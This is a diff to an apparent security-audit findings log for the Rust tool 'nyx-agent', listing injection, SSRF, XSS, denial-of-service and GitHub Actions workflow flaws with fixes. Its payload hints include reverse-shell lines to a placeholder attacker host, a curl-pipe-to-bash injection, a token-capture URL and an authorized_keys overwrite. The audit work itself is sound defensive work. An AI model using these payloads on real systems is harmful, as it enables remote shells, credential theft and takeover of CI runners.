@@ -63,7 +63,7 @@ record_exploration_finding
 record_exploration_finding
 {
   "path": "crates/nyx-agent/src/main.rs",
-  "line": 841,
+  "line": 946,
   "cap": "OS_COMMAND",
   "endpoint": "<cli:--open-cmd>",
   "rationale": "The --open-cmd <cmd> flag is fed straight to std::process::Command::new(&cmd).arg(&url_for_open). No allowlist. Command::new bypasses the shell, so URL metacharacters do not inject; however the cmd value itself is taken verbatim from the CLI, so any caller that builds the daemon invocation from semi-trusted state (orchestration script reading env, supervisord with config drift, etc.) is one substitution away from arbitrary binary spawn at startup. Low severity in isolation, but pairs cleanly with the pre-setup auth-bypass finding: an attacker who reaches the wizard could plant a remediation hint pointing the operator at `--open-cmd /tmp/payload`. Static pass missed because Command::new() with a literal-looking variable does not match the canonical OS-injection sink shape (no shell, no format!).",
@@ -99,8 +99,7 @@ record_exploration_finding
   "line": 759,
   "cap": "INFO_DISCLOSURE",
   "endpoint": "POST /api/v1/repos/test (source_kind=local-path)",
-  "rationale": "The local-path branch (router.rs:759-786) constructs `std::path::Path::new(&req.source_url_or_path)` from the JSON body, then differentiates the response three ways: (a) `path … does not exist` (line 764), (b) `path … is not a directory` (line 771), (c) `path readable; on-disk .git/config remote = <url>` (line 778) — the third branch reads `<path>/.git/config` via read_local_git_remote (router.rs:859) and parses the `[remote \"origin\"]` url= line straight into the response body. There is no allowlist confining the path to the configured repos root, no symlink-follow guard, no rejection of absolute paths outside the daemon's working set. Net effect against an attacker holding the bearer (trivially reachable via the leaked-`?token=` paths above): the endpoint is (i) a full filesystem-existence oracle for any path the daemon's uid can stat, and (ii) a content-exfiltration channel for any `.git/config` the daemon's uid can read — including operator home dirs, neighbouring service workdirs, and CI runner checkouts that frequently carry credential helpers / private-repo URLs in the same file. Distinct sink from the git-ls-remote rows: nothing reaches `git` here. Static pass missed because the disclosure is shaped as a deliberate `ok:true` response field (`on_disk_git_remote`), so taint tracking sees a sanctioned data flow, not a leak.",
-  "suggested_payload_hint": "POST /api/v1/repos/test {\"source_kind\":\"local-path\",\"source_url_or_path\":\"/Users/<op>/work/<private-repo>\"} — non-null on_disk_git_remote in response confirms read; sweep candidate paths to map the operator's checkout tree, then escalate against any path whose .git/config carries a credential-bearing url= line."
+  "rationale": "The local-path branch (router.rs:759-786) constructs `std::path::Path::new(&req.source_url_or_path)` from the JSON body, then differentiates the response three ways: (a) `path … does not exist` (line 764), (b) `path … is not a directory` (line 771), (c) `path readable; on-disk .git/config remote = <url>` (line 778) — the third branch reads `<path>/.git/config` via read_local_git_remote (router.rs:859) and parses the `[remote \"origin\"]` url= line straight into the response body. There is no allowlist confining the path to the configured repos root, no symlink-follow guard, no rejection of absolute paths outside the daemon's working set. Net effect against an attacker holding the bearer (trivially reachable via the leaked-`?token=` paths above): the endpoint is (i) a full filesystem-existence oracle for any path the daemon's uid can stat, and (ii) a content-exfiltration channel for any `.git/config` the daemon's uid can read — including operator home dirs, neighbouring service workdirs, and CI runner checkouts that frequently carry credential helpers / private-repo URLs in the same file. Distinct sink from the git-ls-remote rows: nothing reaches `git` here. Static pass missed because the disclosure is shaped as a deliberate `ok:true` response field (`on_disk_git_remote`), so taint tracking sees a sanctioned data flow, not a leak."
 }
 
 ---
@@ -110,7 +109,7 @@ record_exploration_finding
   "line": 1723,
   "cap": "OS_COMMAND",
   "endpoint": "POST /api/v1/findings/:id/replay",
-  "rationale": "replay_repro_bundle extracts the per-finding USTAR bundle into a tempdir and unconditionally runs `bash <id>/repro.sh`. The script body is built by render_repro_script (repro_bundle.rs) which interpolates finding.id, finding.rule, payload.cap, payload.lang directly into the shell source with no escaping — the format string places them inside `# cap={cap} lang={lang} rule={rule}` comments and inside `echo \"[repro] finding={id} cap={cap}\"`. A newline in `rule` or `cap` breaks out of the comment / quoted echo and runs arbitrary shell. Those fields ride in from CandidateFindingRecord populated by the AI Exploration / NovelFinding passes (the very surfaces this Phase-23 worker writes to), so an attacker who can land a single quarantined candidate with `cap = \"X\\nbash -i >& /dev/tcp/attacker/4444 0>&1\\n#\"` and convince the operator to click \"Replay\" gets shell on the daemon host. The replay handler runs bash directly, no sandbox lane, so the static escape suite gate does not apply. The new sha256 verification at line 1739 confirms bytes match the row but does nothing about content that was malicious at write time. Static pass missed because the taint path crosses sqlite (candidate row -> finding row -> bundle render -> exec).",
+  "rationale": "replay_repro_bundle extracts the per-finding USTAR bundle into a tempdir and unconditionally runs `bash <id>/repro.sh`. The script body is built by render_repro_script (repro_bundle.rs:229) which interpolates finding.id, finding.rule, payload.cap, payload.lang directly into the shell source with no escaping — the format string places them inside `# cap={cap} lang={lang} rule={rule}` comments and inside `echo \"[repro] finding={id} cap={cap}\"`. A newline in `rule` or `cap` breaks out of the comment / quoted echo and runs arbitrary shell. Those fields ride in from CandidateFindingRecord populated by the AI Exploration / NovelFinding passes (the very surfaces this Phase-23 worker writes to), so an attacker who can land a single quarantined candidate with `cap = \"X\\nbash -i >& /dev/tcp/attacker/4444 0>&1\\n#\"` and convince the operator to click \"Replay\" gets shell on the daemon host. The replay handler runs bash directly, no sandbox lane, so the static escape suite gate does not apply. The sha256 verification at router.rs:1740 confirms bytes match the row but does nothing about content that was malicious *at write time*, and is also skipped on the build-on-demand branch (router.rs:1719) when no bundles row exists. Static pass missed because the taint path crosses sqlite (candidate row -> finding row -> bundle render -> exec).",
   "suggested_payload_hint": "candidate_findings row: cap = \"AUTH_BYPASS\\nbash -c 'id|nc attacker 4444'\\n#\"; promote -> POST /findings/<id>/replay; watch attacker tcp:4444 land a callback."
 }
 
@@ -132,7 +131,7 @@ record_exploration_finding
   "line": 346,
   "cap": "XSS",
   "endpoint": "GET /api/v1/runs/:id/summary.md",
-  "rationale": "render_markdown interpolates card.run_id, card.status, card.triggered_by, every BySplit.key (including `by_cap`, `by_origin`, `by_lang`), and every PhaseDuration.phase directly into the markdown body with no escaping (lines 348-406). The HTML sibling render_html (line 259) carefully runs the same fields through escape_html. The HTML route is safe; the markdown route is the surface that bites. by_cap.key comes from findings.cap, by_origin.key from findings.finding_origin, by_lang.key from payloads.lang — every one of those is a string the AI Exploration / NovelFinding writers control (see candidate_findings → findings promotion path). Any consumer that pipes the .md body through a markdown-to-HTML renderer with HTML enabled (the default for marked, markdown-it, react-markdown with rehype-raw) lands `<img src=x onerror=...>` straight into the operator's DOM. Static pass missed because the source field never crosses a `dangerouslySetInnerHTML` call inside the Rust crate — the XSS is a contract violation between the safe HTML renderer and the unsafe MD renderer; both export from the same module so a caller naturally assumes parity.",
+  "rationale": "render_markdown interpolates card.run_id, card.status, card.triggered_by, every BySplit.key (including `by_cap`, `by_origin`, `by_lang`), and every PhaseDuration.phase directly into the markdown body with no escaping (lines 348-406; the push_markdown_split helper at :405-407 prints `- {key}: {count}` raw). The HTML sibling render_html (line 259) carefully runs the same fields through escape_html. The HTML route is safe; the markdown route is the surface that bites. by_cap.key comes from findings.cap, by_origin.key from findings.finding_origin, by_lang.key from payloads.lang — every one of those is a string the AI Exploration / NovelFinding writers control (see candidate_findings → findings promotion path). Any consumer that pipes the .md body through a markdown-to-HTML renderer with HTML enabled (the default for marked, markdown-it, react-markdown with rehype-raw) lands `<img src=x onerror=...>` straight into the operator's DOM. Static pass missed because the source field never crosses a `dangerouslySetInnerHTML` call inside the Rust crate — the XSS is a contract violation between the safe HTML renderer and the unsafe MD renderer; both export from the same module so a caller naturally assumes parity.",
   "suggested_payload_hint": "promote a candidate finding with `cap = \"<img src=x onerror=alert(document.domain)>\"`; GET /api/v1/runs/<run>/summary.md; observe the unescaped tag inside the `## Capability` bullet list; any UI that markdown-renders the body executes the payload."
 }
 
@@ -153,4 +152,132 @@ notes:
 - PATH_TRAVERSAL on GET /findings/:id/repro-bundle.tar: mitigated by ensure_bundle_path_inside_root (router.rs:1639) — dropped
 - INTEGRITY_VIOLATION on replay path: mitigated by verify_bundle_sha256 against repro_bundles.sha256 (router.rs:1739-1746) — dropped
 - DoS finding kept with revised rationale: per-request 120s cap exists, parallelism unbounded
-- new row this pass: INFO_DISCLOSURE on POST /api/v1/repos/test local-path branch — fs-existence oracle + .git/config exfil; distinct sink from the existing SSRF / git-ext:: rows
+- INFO_DISCLOSURE on POST /api/v1/repos/test local-path branch retained: fs-existence oracle + .git/config exfil; distinct sink from the existing SSRF / git-ext:: rows
+
+=================================================================
+ADDITIONAL PASS — task=expl-demo (CLI / argv surface)
+prior rows above target HTTP surface; rows below target the binary's
+own argv + subprocess invocations. Distinct sinks, distinct callers.
+=================================================================
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent/src/main.rs",
+  "line": 1214,
+  "cap": "OS_COMMAND",
+  "endpoint": "<cli:scan --since-ref>",
+  "rationale": "collect_changed_files builds `git -C <ws> diff --name-only --diff-filter=AMR {ref_name}...HEAD` and feeds {ref_name} (operator's --since-ref CLI value) verbatim into .arg(format!(\"{ref_name}...HEAD\")). No `--` end-of-options separator precedes the ref. Refs that start with a dash are parsed by git as options: `--since-ref='--output=/tmp/pwn'` becomes argv `--output=/tmp/pwn...HEAD`, which git diff accepts as --output=<path>, writing the diff to an attacker-chosen path — arbitrary file write as the daemon uid. Similarly `--upload-pack=...` style flags reroute helper execution. Command::new is shell-free so no metacharacter injection, but git's own option parsing is the injection surface. Static pass missed because the value never touches `sh -c` and the format! looks like a ref-spec, not an option.",
+  "suggested_payload_hint": "nyx-agent scan --since-ref='--output=/Users/<op>/.ssh/authorized_keys' → git writes diff body into the target file; or '--upload-pack=/tmp/payload' to coerce helper exec on a fetch path."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent/src/cmd/pr_comment.rs",
+  "line": 343,
+  "cap": "SSRF",
+  "endpoint": "<cli:pr-comment --gh-api>",
+  "rationale": "pr_comment_cmd takes --gh-api as a free-form URL and passes it to trim_url + format!(\"{}/repos/{}/{}/issues/{}/comments\", ...). reqwest is then handed the Bearer <GITHUB_TOKEN> via default headers (pr_comment.rs:313-316, set_sensitive(true) limits stderr printing but does *not* prevent transmission). No host allowlist, no scheme allowlist, no check that the host is api.github.com or a known GHES endpoint. Any operator who runs `nyx-agent pr-comment --gh-api http://attacker/` in CI (typo, env-templating bug, hostile PR that edits a workflow's args) leaks the GITHUB_TOKEN to the attacker on the first request — the bearer is set as a default header so it rides every URL the client touches. Worse, the same primitive is an SSRF from the runner's network position: --gh-api=http://169.254.169.254/latest/ pivots into cloud-metadata while still carrying the GitHub bearer. Static pass missed because the URL is operator-typed and the SDK call looks canonical.",
+  "suggested_payload_hint": "nyx-agent pr-comment --gh-api 'http://attacker.example/' --repo owner/repo --pr 1 ; capture the inbound Authorization: Bearer ghp_… header at attacker.example."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent/src/cmd/pr_comment.rs",
+  "line": 297,
+  "cap": "PATH_TRAVERSAL",
+  "endpoint": "<cli:pr-comment --repo>",
+  "rationale": "split_repo accepts owner/name where owner is anything not containing the first '/', and name is anything after with no further validation beyond emptiness and a second '/'. owner is then interpolated raw into format!(\"{}/repos/{}/{}/issues/{}/comments\", trim_url(api_base), owner, repo, pr). owner = '..%2f..%2fevil' (or with bare '..' segments after percent-decoding by upstream) reshapes the path; owner containing '#' or '?' truncates against the api_base's intended path, redirecting POSTs to unintended GitHub endpoints; owner with embedded user-info ('@evil.example/foo') is parsed by hyper as host-override on relative URL joins. The endpoint POSTs a comment body and carries the bearer — the wrong endpoint either accepts the bearer (cross-tenant write) or rejects it after logging it. Static pass missed because the validator (split_once + name.contains('/') guard) reads correct in isolation; the bug is that owner-side characters were not constrained to ^[A-Za-z0-9._-]+$.",
+  "suggested_payload_hint": "nyx-agent pr-comment --repo 'evil%2faccount/repo' --pr 1 → resulting URL contains %2f after GitHub's path-segment boundary; observe which GitHub endpoint the POST resolves to."
+}
+
+=================================================================
+PASS 3 — task=expl-demo (pr-comment dedup + body rendering)
+rows below target the new tests/pr_comment_dedup.rs contract and
+the render_comment_body interpolation surface. Distinct sinks.
+=================================================================
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent/src/cmd/pr_comment.rs",
+  "line": 363,
+  "cap": "AUTH_BYPASS",
+  "endpoint": "<cli:pr-comment dedup match — find_existing_comment>",
+  "rationale": "find_existing_comment treats `b.contains(COMMENT_MARKER)` (pr_comment.rs:363) as the dedup signal, with no author-id check on the CommentEnvelope. COMMENT_MARKER is the literal string `<!-- nyx-agent:pr-comment v1 -->` and is published in the public repo + every prior agent comment. GitHub returns issue comments in chronological order, so any PR commenter who posts a body containing the marker substring (a fork-PR author, a maintainer doing a prank, anyone with comment perms on the issue) shadows the real agent comment: the agent picks up the attacker's comment id and routes the next run through update_comment -> PATCH /repos/.../issues/comments/:id, which GitHub rejects with 403 because the bot does not own the comment. PrCommentError::GitHub bubbles up and the run exits non-zero without ever posting the confirmed-findings list. Net effect: a single attacker comment silences the agent on that PR indefinitely, and (worse) the operator's CI sees a non-zero `pr-comment` step and may interpret that as an unrelated infrastructure failure. The CommentEnvelope struct already deserialises `id` but not `user.login` / `user.type` / `performed_via_github_app` — the marker check is the *only* gate. Static pass missed because the contains() match looks defensive, and there is no tainted-flow shape to follow.",
+  "suggested_payload_hint": "as any user with comment perms on the PR: POST /repos/<o>/<r>/issues/<pr>/comments {\"body\":\"hi <!-- nyx-agent:pr-comment v1 --> sorry\"}; next nyx-agent pr-comment run errors with `update comment returned 403` and the agent's own (later) comment never lands."
+}
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent/src/cmd/pr_comment.rs",
+  "line": 196,
+  "cap": "MARKDOWN_INJECTION",
+  "endpoint": "<cli:pr-comment render_comment_body — body POSTed to GitHub>",
+  "rationale": "render_comment_body (pr_comment.rs:160-235) interpolates `report.run_id`, `report.since_ref`, every `row.repo`, `row.path`, `row.rule` and every `chain.id` raw into the markdown body that the bot POSTs to GitHub. The interpolations wrap most fields in backticks (e.g. `**`{repo}` / `{path}`**` at :196 and ``  - {severity_badge} {origin_badge} `{rule}`{line}{chain} - id `{id}` `` at :206-208), but a single literal backtick inside `path` or `rule` closes the inline-code span and lets any subsequent text inside the same field render as markdown. The `path` value is the on-disk filename of the offending source file (operator-controlled in the trusted case, but attacker-controlled whenever a hostile PR introduces a new file — exactly the contract the pr-comment subcommand runs under, by definition). The `rule` value is the rule id from the rule registry; mostly safe today, but the AI Exploration / NovelFinding writers can mint new rule strings (see candidate_findings.rule → findings.rule). GitHub markdown happily renders sanctioned HTML (`<img src=…>`, `<a href=…>`, blockquotes, headings) after a marker breakout, so a hostile filename like `evil\\`<a href=\"https://phish\">click for the real audit</a>\\`.py` lets an attacker put attacker-chosen content inside the bot's high-trust signed comment (the `<!-- nyx-agent:pr-comment v1 -->` marker reads to humans as 'this is the audit bot'). Static pass missed because the renderer treats the data as report text — the trust boundary (rendered-by-GitHub *as the bot*) is implicit, not in the type system. Suggested fix: escape backticks and angle brackets in repo/path/rule before interpolation, or wrap each field with a fenced code span using a dynamic fence length (`` ``` `` runs longer than any embedded backtick run).",
+  "suggested_payload_hint": "hostile branch: `mkdir -p \"src/\\`<a href='https://phish.example'>maintainer-approved fix</a>\\`/\"` then push a file under that dir whose contents trigger any rule; nyx-agent pr-comment renders the path into the body; GitHub renders the anchor inside the bot's signed comment."
+}
+
+notes (pass 3):
+- COMMENT_MARKER source: src/cmd/pr_comment.rs (constant at module top, also embedded in tests/pr_comment_dedup.rs:47)
+- find_existing_comment pagination: max 100 pages of 100 each = 10k comments; on a busier PR the marker is theoretically skipped and a duplicate posts. Lower-severity correctness bug, not raised separately.
+- update_comment path /repos/<o>/<r>/issues/comments/:id requires bot ownership server-side; that asymmetry is what turns the marker-collision row above into a permanent silence rather than a comment-overwrite.
+- pr_comment_dedup.rs (new test) exercises the create-then-update path against a wiremock GitHub but does not seed an attacker-authored marker comment, so the AUTH_BYPASS row above is currently *not* covered by the test contract.
+
+=================================================================
+PASS 4 — task=expl-demo (short_id byte-slice on operator-trusted strings)
+distinct sink from any prior row; verified against current pr_comment.rs head.
+=================================================================
+
+---
+record_exploration_finding
+{
+  "path": "crates/nyx-agent/src/cmd/pr_comment.rs",
+  "line": 290,
+  "cap": "DOS",
+  "endpoint": "<cli:pr-comment build_comment_body — finding.id / chain.id / chain.member_ids[*]>",
+  "rationale": "short_id (pr_comment.rs:288-291) slices its &str argument by byte: `let take = id.len().min(12); id[..take].to_string()`. Rust's str-index `[..n]` panics (`byte index N is not a char boundary; it is inside '<codepoint>' (bytes A..B)`) whenever `n` lands mid-codepoint. `short_id` is called four times during render_comment_body (pr_comment.rs:201 row.id, :203 cid, :219 m, :224 chain.id). Every one of those values originates in the report.json the operator hands to `pr-comment --report` — schema_version 1 plus a free-form `id: String`, `chain_id: Option<String>`, and `member_ids: Vec<String>` (scan_report.rs:36-46, :49-54). Findings.id, chain id, and member_ids are persisted in sqlite from candidate_findings rows that the AI Exploration / NovelFinding workers write, so an attacker who lands a single candidate with id like `aaaaaaaaaaa\\u{1F4A3}rest` (11 ASCII + a 4-byte 💣 codepoint that straddles byte 12) walks the renderer into the panic. The `pr-comment` subcommand runs inside the GitHub Action; an unrecovered panic kills the process, the Action step exits non-zero, and the PR comment never lands — the operator sees a CI infrastructure failure with no clear root cause, and any other follow-up step (status check, audit upload) that depended on `pr-comment` succeeding silently no-ops. Worse, build_comment_body is also reachable from cargo unit tests and from any future caller that renders untrusted reports (web UI, CLI `nyx-agent run-card`-style flows). Static pass missed because the panic source is not the canonical `unwrap()` / `expect()` shape — it is a perfectly type-correct slice on a length the developer believed could not span a codepoint. Fix: `id.chars().take(12).collect::<String>()` (Unicode-safe) or `id.get(..take).unwrap_or(id).to_string()` (byte-safe with fallback). Same fix pattern applies to any sibling helper in run_card.rs / report code that slices ids by byte.",
+  "suggested_payload_hint": "candidate_findings.id = string with 11 ASCII bytes followed by a 4-byte UTF-8 codepoint (e.g. `aaaaaaaaaaa💣rest`); promote -> scan emits report.json with that id; nyx-agent pr-comment --report ... panics in short_id at the .min(12) byte boundary. Reproduce in-process via `cargo test -p nyx-agent -- pr_comment::short_id` with input `\"aaaaaaaaaaa💣\"` (`a` is 1 byte, `💣` is 4 bytes → len=15, take=12 lands inside the 💣)."
+}
+
+notes (pass 4):
+- single new row; remaining suspect spots (extract_rationale fallthrough, map_chain CSV split on commas inside a member_id, find_existing_comment 10k-page ceiling) read as correctness bugs rather than security findings, so left out per quality-over-count guidance.
+- short_id is the only byte-indexed slice in pr_comment.rs; the analogous sink in run_card.rs / report code was not re-walked this pass — flag for the next exploration round.
+
+=================================================================
+PASS 5 — task=expl-demo (composite GitHub Action surface)
+new file this branch: .github/actions/nyx-agent/action.yml.
+sinks below sit in YAML + bash, not in the Rust crate, which is
+why the prior four passes did not touch them.
+=================================================================
+
+---
+record_exploration_finding
+{
+  "path": ".github/actions/nyx-agent/action.yml",
+  "line": 76,
+  "cap": "OS_COMMAND",
+  "endpoint": "<gha:composite step `Run nyx-agent scan` / `Post PR comment`>",
+  "rationale": "Every `${{ inputs.* }}` reference in the composite Action is substituted by the GitHub Actions runner *before* bash sees the script, so the surrounding double-quotes are added literally after the value lands in the script body. Affected lines: 76-82 (`inputs.nyx-agent-binary`, `inputs.config`, `inputs.state-dir` via `steps.state.outputs.dir`, and the `--since-ref ${{ github.base_ref }}` arg), and 92-100 (same binary + config + state-dir, plus `inputs.ui-url`, `inputs.gh-api`, and `${{ github.event.pull_request.number }}`). Any input value containing `\"`, `$(...)`, or backtick syntax breaks out of the quoted arg and runs arbitrary code on the runner under the same shell as `GITHUB_TOKEN=${{ inputs.gh-token }}` (the env at line 73/88). The classic tj-actions/changed-files class. Concrete reach: a consumer workflow that wires `with: ui-url: ${{ github.event.pull_request.body }}` (or `gh-api`, or `config`) — a pattern operators *will* paste when they want the comment link to vary per-PR — gives any PR author RCE on the runner with the `pull-requests: write` token in scope. `github.base_ref` is normally repo-controlled (the target branch name), but `pull_request_target` workflows that fall back to `github.head_ref` for the diff base hand fork authors the same primitive without any consumer-side mistake; the head-ref name is fully attacker-controlled. Static pass missed because none of this is Rust — the sink is GHA expression substitution adjacent to a shell script with no `${{ env.NAME }}` indirection (the canonical mitigation: assign to env then reference `$NAME` so bash, not GHA, does the substitution).",
+  "suggested_payload_hint": "consumer workflow with `uses: ./.github/actions/nyx-agent` and `with: ui-url: ${{ github.event.pull_request.body }}`; attacker opens PR whose body is `\"; curl http://attacker/x|bash; #` — the `pr-comment` step's bash run-block evaluates to `... --ui-url \"\"; curl http://attacker/x|bash; #\" --gh-api ...` and executes the curl. Fix: pre-bind every input to an `env:` map and reference `$INPUT_UI_URL` inside the script — never `${{ inputs.ui-url }}` directly in `run:`."
+}
+
+---
+record_exploration_finding
+{
+  "path": "docs/ci/github-actions.md",
+  "line": 33,
+  "cap": "AUTH_BYPASS",
+  "endpoint": "<docs:recommended workflow recipe>",
+  "rationale": "The Permissions section recommends `pull_request_target` over `pull_request` so the bot can comment on fork PRs (line 33-34: 'pull_request_target is recommended over pull_request for this reason'). `pull_request_target` runs with the *base* repository's secrets, including a `GITHUB_TOKEN` carrying every permission declared in the workflow (`pull-requests: write` here, often more in real workflows). The accompanying example at line 70-78 uses `actions/checkout@v4` with no `ref:` override — that defaults to the base ref and is safe. The hazard is that the docs (a) do not warn that adding `ref: ${{ github.event.pull_request.head.sha }}` to `actions/checkout` while running under `pull_request_target` checks out attacker-controlled code into a step that holds the privileged base-repo token, and (b) instruct operators to point `nyx-agent.toml` at `path = \".\"` (line 99) so the scanner walks the working tree verbatim. Combined with the `i_own_this = true` template at line 97, a single PR that mutates `nyx-agent.toml` to point `path` at any operator-readable directory turns the agent into a privileged-token-armed file reader against the runner host (and the AI Exploration / NovelFinding workers then carry the contents back into the PR comment via the rendered `path` / `rule` / `cap` fields — see the pass 3 MARKDOWN_INJECTION row). The docs are the trust boundary: this is a documentation-shaped vulnerability where the canonical recipe leads operators into a privilege-escalation pattern. GitHub itself called this class out in 2021 (`Keeping your GitHub Actions and workflows secure: Preventing pwn requests`). Static pass missed because Markdown is not on the input list and the absence of a warning is not a tainted-flow signature.",
+  "suggested_payload_hint": "n/a — defence is text. Add a boxed warning under the Permissions section: 'When using pull_request_target, do NOT pass `ref: ${{ github.event.pull_request.head.sha }}` to actions/checkout. The base ref's secrets are in scope; checking out fork code lets PR authors plant a nyx-agent.toml override and exfiltrate runner state via the PR comment.' Mirror the GitHub security advisory wording so operators recognise it."
+}
+
+notes (pass 5):
+- action.yml never echoes the bearer (line 73/88 confine GITHUB_TOKEN to env, never argv); good. The composite uses `bash` with `set -euo pipefail` which propagates non-zero exits — fine.
+- ${{ github.event.pull_request.number }} at line 97 is integer-typed by GitHub before injection; not a string-injection sink on its own (verified: GHA serialises numeric event fields as bare integers without quoting metachars). Left out of the OS_COMMAND row above.
+- the existing pass-2 `--since-ref` git-option-injection row becomes *operator-reachable but not fork-attacker-reachable* under this action.yml because github.base_ref is repo-controlled. A consumer workflow that swaps in github.head_ref would lift it to fork-reachable; flagged here, not raised as a separate row.
+- composite Action workflow has no `permissions:` block of its own; it inherits the caller's. Acceptable for composite Actions, but worth a doc note that the caller must grant exactly `pull-requests: write` (not blanket `write-all`).
